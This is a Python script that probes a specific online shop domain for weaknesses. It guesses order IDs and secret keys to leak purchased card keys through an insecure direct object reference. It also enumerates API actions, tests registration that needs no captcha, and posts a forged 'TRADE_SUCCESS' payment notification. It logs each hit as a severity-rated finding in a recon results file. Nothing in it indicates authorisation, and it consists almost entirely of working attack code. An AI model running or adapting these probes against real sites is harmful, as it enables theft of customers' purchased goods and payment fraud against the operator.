#!/usr/bin/env python3
import sys, json, time, subprocess
sys.stdout.reconfigure(line_buffering=True)
BASE = "https://xinhe001.lol/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
findings = []

def curl(url, method="GET", data=None):
    time.sleep(6)
    cmd = ["curl","-sS","-m","12","-A",UA,"-w","\n__%{http_code}"]
    if method=="POST":
        cmd += ["-X","POST","-H","Content-Type: application/x-www-form-urlencoded","-d",data]
    cmd.append(url)
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=20).decode()
    except Exception as e:
        return str(e), 0
    if "__" in out:
        b,c = out.rsplit("__",1)
        return b.strip(), int(c.strip())
    return out, 0

def hit(lv,t,d):
    findings.append({"level":lv,"title":t,"detail":d})
    print(f"[{lv}] {t}: {d[:200]}", flush=True)

print("=== order IDOR ===", flush=True)
for oid in [1,2,5,10,50]:
    for sk in ["", "1", "000000", "12345678"]:
        b,c = curl(f"{BASE}/ajax.php?act=order", "POST", f"id={oid}&skey={sk}")
        print(f"id={oid} skey={sk!r:10} http={c} {b[:100]}", flush=True)
        if '"code":0' in b or "kminfo" in b:
            hit("Critical","订单卡密泄露",f"id={oid} skey={sk} {b[:300]}")
            break

print("=== api.php ===", flush=True)
for act in ["goods","order","kmlist","shop"]:
    b,c = curl(f"{BASE}/api.php?act={act}")
    print(f"act={act} http={c} {b[:80]}", flush=True)
    if c==500:
        hit("Med", f"api.php act={act} 端点存在(500)", b[:100])

print("=== quickreg ===", flush=True)
b,c = curl(f"{BASE}/user/ajax.php?act=quickreg","POST","type=qq&submit=do")
print(f"quickreg: {b[:150]}", flush=True)
if '"code":0' in b:
    hit("High","quickreg无验证码注册",b)

print("=== notify ===", flush=True)
b,c = curl(f"{BASE}/other/epay_notify.php","POST","trade_no=1&trade_status=TRADE_SUCCESS")
print(f"epay_notify: {b[:80]}", flush=True)

json.dump({"findings":findings}, open("/workspace/aaap-recon/xinhe_mini_results.json","w"), ensure_ascii=False, indent=2)
print(f"DONE {len(findings)}", flush=True)
